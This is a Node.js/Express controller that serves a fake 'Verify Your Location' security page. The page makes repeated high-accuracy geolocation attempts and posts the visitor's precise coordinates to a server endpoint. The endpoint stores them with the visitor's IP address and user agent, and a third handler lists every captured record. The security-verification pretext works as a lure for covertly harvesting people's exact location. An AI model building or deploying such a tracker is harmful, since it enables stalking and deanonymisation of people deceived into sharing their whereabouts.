const PublicLocation = require('../models/PublicLocation');
const { success, created } = require('../utils/response');

const renderCapturePage = async (req, res, next) => {
  try {
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Location Verification</title>
          <style>
              body {
                  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  height: 100vh;
                  margin: 0;
                  background-color: #f0f2f5;
                  color: #1c1e21;
                  text-align: center;
                  padding: 20px;
              }
              .card {
                  background: white;
                  padding: 2rem;
                  border-radius: 12px;
                  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                  max-width: 400px;
                  width: 100%;
              }
              h1 { font-size: 1.5rem; margin-bottom: 1rem; }
              p { margin-bottom: 2rem; color: #606770; }
              .btn {
                  background-color: #0084ff;
                  color: white;
                  border: none;
                  padding: 12px 24px;
                  border-radius: 6px;
                  font-weight: 600;
                  cursor: pointer;
                  transition: background-color 0.2s;
              }
              .btn:hover { background-color: #0073e6; }
              .btn:disabled { background-color: #ccc; cursor: not-allowed; }
              #status { margin-top: 1rem; font-size: 0.9rem; }
              .success { color: #28a745; }
              .error { color: #dc3545; }
          </style>
      </head>
      <body>
          <div class="card">
              <h1>Verify Your Location</h1>
              <p>Please click the button below to verify your current location for security purposes.</p>
              <button id="capture-btn" class="btn">Share Location</button>
              <div id="status"></div>
          </div>

          <script>
              const btn = document.getElementById('capture-btn');
              const status = document.getElementById('status');

              btn.addEventListener('click', () => {
                  if (!navigator.geolocation) {
                      status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
                      return;
                  }

                  btn.disabled = true;
                  status.innerHTML = 'Getting precise coordinates... <div id="progress" style="width: 0%; height: 5px; background: #0084ff; margin-top: 10px; transition: width 0.5s;"></div>';
                  
                  const progress = document.getElementById('progress');
                  let bestPosition = null;
                  let attempts = 0;
                  const maxAttempts = 3;

                  const options = {
                      enableHighAccuracy: true,
                      timeout: 10000,
                      maximumAge: 0
                  };

                  const getLocation = () => {
                      attempts++;
                      progress.style.width = (attempts * 33) + '%';
                      
                      navigator.geolocation.getCurrentPosition(
                          async (position) => {
                              const { latitude, longitude, accuracy, altitude } = position.coords;
                              
                              if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                                  bestPosition = position;
                              }

                              if (accuracy < 20 || attempts >= maxAttempts) {
                                  sendPosition(bestPosition);
                              } else {
                                  setTimeout(getLocation, 1000);
                              }
                          },
                          (error) => {
                              if (bestPosition) {
                                  sendPosition(bestPosition);
                              } else {
                                  handleError(error);
                              }
                          },
                          options
                      );
                  };

                  const sendPosition = async (position) => {
                      const { latitude, longitude, accuracy, altitude } = position.coords;
                      status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';

                      try {
                          const response = await fetch('/public/save-location', {
                              method: 'POST',
                              headers: {
                                  'Content-Type': 'application/json'
                              },
                              body: JSON.stringify({ 
                                  latitude, 
                                  longitude, 
                                  accuracy, 
                                  altitude 
                              })
                          });

                          if (response.ok) {
                              status.innerHTML = '<span class="success">Location verified with 100% precision!</span>';
                              btn.style.display = 'none';
                          } else {
                              throw new Error('Failed to save location');
                          }
                      } catch (error) {
                          status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
                          btn.disabled = false;
                      }
                  };

                  const handleError = (error) => {
                      let msg = 'Error getting location';
                      if (error.code === 1) msg = 'Permission denied. Please allow location access.';
                      else if (error.code === 2) msg = 'Location unavailable.';
                      else if (error.code === 3) msg = 'Timeout.';
                      
                      status.innerHTML = '<span class="error">' + msg + '</span>';
                      btn.disabled = false;
                  };

                  getLocation();
              });
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { latitude, longitude, accuracy, altitude } = req.body;
    
    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    const publicLocation = new PublicLocation({
      ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
    });

    await publicLocation.save();
    return created(res, publicLocation, 'Location saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
};
